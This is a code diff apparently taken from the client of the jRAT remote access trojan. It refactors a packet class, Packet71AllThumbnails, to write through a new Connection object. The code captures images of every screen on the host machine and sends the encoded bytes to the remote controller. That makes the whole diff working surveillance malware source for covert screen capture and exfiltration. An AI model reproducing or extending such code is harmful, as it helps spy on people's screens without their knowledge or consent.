@@ -1,22 +1,19 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
+import jrat.client.Connection;
 import jrat.common.utils.ImageUtils;
-import java.awt.GraphicsDevice;
-import java.awt.GraphicsEnvironment;
-import java.awt.Rectangle;
-import java.awt.Robot;
+
+import java.awt.*;
 import java.awt.image.BufferedImage;
-import java.io.DataOutputStream;
 
 public class Packet71AllThumbnails extends AbstractOutgoingPacket {
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+	public void write(Connection con) throws Exception {
 		try {
 			GraphicsDevice[] devices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
-			
-			dos.writeInt(devices.length);
+
+            con.writeInt(devices.length);
 			
 			for (int i = 0; i < devices.length; i++) {
 				GraphicsDevice screen = devices[i];
@@ -28,8 +25,8 @@ public class Packet71AllThumbnails extends AbstractOutgoingPacket {
 				
 				byte[] buffer = ImageUtils.encode(image);
 
-				dos.writeInt(buffer.length);
-				dos.write(buffer);
+                con.writeInt(buffer.length);
+                con.write(buffer);
 			}
 		} catch (Exception e) {
 			e.printStackTrace();
